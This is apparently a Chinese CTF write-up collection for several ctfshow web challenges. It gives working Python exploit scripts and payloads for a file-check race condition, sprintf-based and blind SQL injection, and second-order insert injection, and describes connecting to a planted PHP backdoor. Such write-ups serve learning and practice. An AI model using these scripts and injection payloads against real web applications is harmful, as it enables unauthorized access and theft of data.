#### 红包题第六弹

==**对网上搜寻的题解进行一些勘误**==

实际上有fastcoll生成的相同的MD5值的文件仍然绕不过第一层的md5_file，因为新生成的两个文件的md5值才相同，而与源文件不同，**本题实际考察的是条件竞争**，通过并发编程实现先后两层的绕过

##### 信息收集

首先有hint提示，不是SQL注入，可以发现源码，于是使用dirmap扫描出来有网站备份文件，解压后，代码如下：

```php
function receiveStreamFile($receiveFile){
 
    $streamData = isset($GLOBALS['HTTP_RAW_POST_DATA'])? $GLOBALS['HTTP_RAW_POST_DATA'] : '';
 
    if(empty($streamData)){
        $streamData = file_get_contents('php://input');
    }
    if($streamData!=''){
        $ret = file_put_contents($receiveFile, $streamData, true);
    }else{
        $ret = false;
    }
    return $ret;
}
if(md5(date("i")) === $token){
	
	$receiveFile = 'flag.dat';
	receiveStreamFile($receiveFile);
	if(md5_file($receiveFile)===md5_file("key.dat")){
		if(hash_file("sha512",$receiveFile)!=hash_file("sha512","key.dat")){
			$ret['success']="1";
			$ret['msg']="人脸识别成功!$flag";
			$ret['error']="0";
			echo json_encode($ret);
			return;
		}

			$ret['errormsg']="same file";
			echo json_encode($ret);
			return;
	}
			$ret['errormsg']="md5 error";
			echo json_encode($ret);
			return;
} 

$ret['errormsg']="token error";
echo json_encode($ret);
return;
```

##### 代码审计

首先有一个对token的判断，于是我们抓包看看，

![](D:\0-CTF\Documents\WP\images\ctfshow_红包题6_1.jpg)

发现确实有一个token，是对当前日期做了一个MD5的编码，可以用python实现，然后设置了一个receivefile为flag.dat，然后调用`receiveStreamFile($receiveFile);`，可以发现是需要用php://input获取文件流，然后返回一个文件，接下来需要自己传上去的文件与已存在的`key.dat`的MD5要一致，sha512不一致，即可打印出flag

##### 解题

那么我们的思路是，首先获得key.dat，首先访问一下这个文件，emmm，果然直接下载了，那么第一层的绕过我们直接就使用了`key.dat`文件，第二层的sha1值我们随便上传一个字符串即可，所以我们需要**并发编程，将$receiveFile中的内容在极短时间内进行替换**，这里我们可以编写一个python脚本来进行解题。

payload:

```python
import requests
import time
import hashlib
import threading

#这里为什么用分钟数生成：因为通过抓包发现改变分钟后token值才会变化
i=str(time.localtime().tm_min)
#生成token
m=hashlib.md5(i.encode()).hexdigest()
url="http://063e4649-b8da-4090-8a6b-da6b11fa5f07.challenge.ctf.show/check.php?token={}&php://input".format(m)

def POST(data):
    try:
        r=requests.post(url,data=data)
        if "ctfshow" in r.text:
            print(r.text)
            pass
        # print(r.text)
        pass
    except Exception as e:
        print("somthing went wrong!")
        pass
    pass

with open('key.dat','rb') as t:
    data1=t.read()
    pass
for i in range(50):
    threading.Thread(target=POST,args=(data1,)).start()
for i in range(50):
    data2='emmmmm'
    threading.Thread(target=POST,args=(data2,)).start()
```

得出：

```
{"success":"1","msg":"\u4eba\u8138\u8bc6\u522b\u6210\u529f!ctfshow{6f98bbcc-82e2-4c3e-a46e-0a8f8ad403cd}","error":"0","errormsg":""}
```



#### 红包题第七弹

##### 信息收集

一开始进去就是一个phpinfo的页面，发现disable_function了一些函数，猜测会用到shell命令，但是没有多余的信息，于是使用dirmap扫描，发现有.git文件，直接访问得到403，无果，可能存在git泄露。

##### 解题

于是尝试获取源码，先后使用Git Hack和Git_Extract获取，Githack只获取到了存在index.php和backdoor.php两个文件名，另一个获取到了源码，如下：

![](D:\0-CTF\Documents\WP\images\ctfshow_红包题7_1.jpg)

得到Letmein后门，于是用中国蚁剑连接，发现读取不了文件，果然是disable_function在起作用，那么我们再使用一下插件，发现也打不开，emmm，那就手工吧，现在是蚁剑已经获取到了文件目录，在`var/www/flag.txt`可能存在flag，于是我使用如下payload:

`Letmain=print_r(highlight_file("var/www/flag.txt"))`，成功解题



#### 萌新赛-给她

##### 信息收集

进去是一个SQL语句展示，emmm，那就写几句SQL注入看看，抓包，用字典FUZZ，一个没出，发现单引号都被转义了，猜测后台是有一个`addslashes`函数，那么我们可以联想到`sprintf`函数与`addslashes`函数连用造成的逻辑漏洞，但是不确定，目录扫描可不能少，扫一下，发现有git，直接访问报403，那用GitHack拉取一下，发现`hint.php`

![](D:\0-CTF\Documents\WP\images\ctfshow_给她_1.jpg)

发现确实如我们所想，存在sprintf函数

##### sprintf函数的底层逻辑漏洞

由于该函数的底层逻辑上只对15中占位符有分支，而其他的则直接没处理，而造成的被替换为空字符，如：

```php
<?php
$sql="select * from user where username='%\' and 1=1 #';";
$user='admin';
echo sprintf($sql,$user);
?>
//打印出来：select * from user where username='' and 1=1 #';
```

**可被替换为空的占位符：`%\`,`%1$\`**

##### 解题

那么我可以构造如下payload：`name=admin&pass=1%1$'or 1=1%23`

在后台应该是：`select * from user where name ='admin' and pass='1'or 1=1#'`

返回了一个报错页面，发现不是原生的报错，check一下源码：

![](D:\0-CTF\Documents\WP\images\ctfshow_给她_2.jpg)

发现存在hint，那么文件位置我们已经知晓，下面就是如何读取文件，首先想到的是用load_file函数，但是没搞出来，然后无意间抓了一个包，好家伙，**cookie里竟然藏了一个file**，抓出来转16进制，得到`flag.txt`，那么我们放入`/flag`的16进制进去`2f666c6167`，放包，得到flag：`ctfshow{9cd199ec-f7ef-41e0-9a1f-234d9ab5628d}`

![](D:\0-CTF\Documents\WP\images\ctfshow_给她_3.jpg)



#### 萌新赛-萌新记忆

##### 信息收集

首先进去是一堆无用界面，都是静态的图片触发，没有交互，那么必备程序，扫后台，**启动dirmap，扫出来了，芜湖~，发现admin界面**

![](D:\0-CTF\Documents\WP\images\ctfshow_萌新记忆_1.jpg)

![](D:\0-CTF\Documents\WP\images\ctfshow_萌新记忆_2.jpg)

那么接下来就是抓包分析，登录抓一个包，然后用字典Fuzz，看看有没有SQLi，这里我首先Fuzz密码，发现都是同一回显，恼，但是**Fuzz登录名的时候爆出来SQL语句错**，嘿嘿，那么肯定是SQLi啦。

![](D:\0-CTF\Documents\WP\images\ctfshow_萌新记忆_3.jpg)

分别有四种回显：`我报警了`，`用户···········错误`,`用户名/密码错误`,`原生SQL报错`

第一种明显就是直接黑名单了，`or,select,limit,order by,concat,group_concat,database,....`都被过滤掉了

还剩下，`updataxml,||,as,',(),`

##### 解题

接下来就是探寻如何解题，首先想到报错注入，但是啊，gourp_concat和concat被ban掉了，好像爆不出来，那么按照优先级：**`union>报错>盲注>时间盲注`，那么我们尝试bool盲注，使用`||`拼接，**

**尝试payload:`admin123'||'1'<'2`，`>=`都被ban了，单引号就是为了闭合，在用户名不匹配时，||前面才是false，后面就可以由我们自己产生想要的bool值**，如上payload返回：

![](D:\0-CTF\Documents\WP\images\ctfshow_萌新记忆_4.jpg)

我们再构造payload：`admin123'||'1'<'1`

![](D:\0-CTF\Documents\WP\images\ctfshow_萌新记忆_5.jpg)

可见，产生不同的回显，那么我们就可以编写盲注脚本进行猜解了

首先我们可以确定存在admin用户，那么接下来获取其密码，但是**经过多次试验，对payload有长度限制，当输入`admin'||length(p)<30'`和`admin'||length(p)<3'`的回显不一样，一个会返回用户名错误，一个会返回报错，实际这条SQL语句确实会报错**，说明后端对用户名有长度限制，

emmm，无所谓，改一下`a'||length(p)<30||'`，这个为基础先用BP重放得到p字段的长度，<15,<20,<19,<18,<17，最后得到p字段长度为17 

下面编写脚本得到密码：

```python
import requests

url='http://d824de54-d045-47c7-a554-dac4d607ed57.challenge.ctf.show/admin/checklogin.php'
#按照ASCII大小排序
str='1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
password=''
for j in range(1,18):
    for i in str:
        payload="'||substr(p,%d,1)<'%s"%(j,i)
        data={
            "u":payload,
            "p":1
        }
        resp=requests.post(url=url,data=data)
        # print(resp.text)
        if "密码错误" in resp.text and "用户名" not in resp.text:
            password+=chr(ord(i)-1)
            print(password)
            break
        pass
    pass
print("password:"+password)
```

最后得到密码:`cptbtptpbcptdtptp`

登录得flag：`ctfshow{9cbc6211-d74d-4ee0-8055-2d434614e27b}`



#### 一切都看起来那么合情合理

##### 信息收集

​		源码，无。扫，有。压缩包，解压，代码审计。

##### 代码审计

​		审了半天啥也没审出来。看来别人题解，发现是PHP的session反序列化，没接触过，学习一下。[PHPsession发序列化](https://xz.aliyun.com/t/6640)。

​		



#### 内部赛-签到

##### 信息收集

​		注册登录，无收获，扫目录，出源码，代码审计。

##### 代码审计

​		有三个界面，`login.php`，`register.php`，`user.php`，首先关注到的是，SQL语句，发现有两处

`$sql ="select username from test1 where email='$e' and password='$p'";`

`$sql ="insert into test1 set email = '$e', username = '$u',password = '$p'";`

可以看到通过email和password选出username，而**username是唯一的回显位**，那么大概率从此处入手。

##### 解题

​		如何构造注入。我们需要用到两处地方，即两次对数据库操作的地方，一处用于插入payload，在`register.php`，一处用于执行payload，在`login.php`，而且只有`login.php`有强过滤，在`register`出可以使用`union select`，还需要注意一点，在`user.php`中使用了`is_numberic()`函数对回显`username`进行了过滤，只能显示数字，但是没关系，这里通过hex编码绕过，**可以查一下，该函数对16进制的字符串当作数字处理。**

代码审懂了，但是脚本编写能力确实还欠佳，参考了一下别的师傅的代码，做了一点修改，直接可以跑出答案

代码解读：

**为什么不直接选出答案，而是通过循环加`substr`，因为回显username有字数限制，也可以稍微改大一点，可以加快flag的产生**

构造出来的SQL：在username处找flag，至于爆表爆字段改一改就行了，**这里很巧妙，通过两段插入点，使用内联注释`/*,username='*/`**，**还有一个注意点，原来的insert的语句使用了换行符，所以p是会被赋值，而不会被#注释掉**

```sql
insert into test1 set email = '1', username = hex(hex(substr((select/**/flag/**/from/**/flag)from/**/1/**/for/**/1))),/*,
username='*/#',
password = '1'
```

```python
import requests
import re

url1 = "http://7580c911-e3e6-47eb-8ca8-83252f9038aa.challenge.ctf.show/register.php"
url2 = "http://7580c911-e3e6-47eb-8ca8-83252f9038aa.challenge.ctf.show/login.php"
flag = ''
for i in range(1, 50):
    payload = "hex(hex(substr((select/**/flag/**/from/**/flag)from/**/" + str(i) + "/**/for/**/1))),/*"
    s = requests.session()
    data1 = {
        'e': str(i) + "',username=" + payload,
        'u': "*/#",
        'p': i
    }
    r1 = s.post(url1, data=data1)
    data2 = {
        'e': i,
        'p': i
    }
    r2 = s.post(url2, data=data2)
    t = r2.text
    try:
        real = re.findall("Hello (.*?),", t)[0]
        flag += real
    except IndexError:
        strs=bytes.fromhex(flag)
        strss=bytes.fromhex(strs.decode())
        print(strss.decode())
        break
```

![](D:\0-CTF\Documents\WP\images\ctfshow-内部赛-签到_1.jpg)
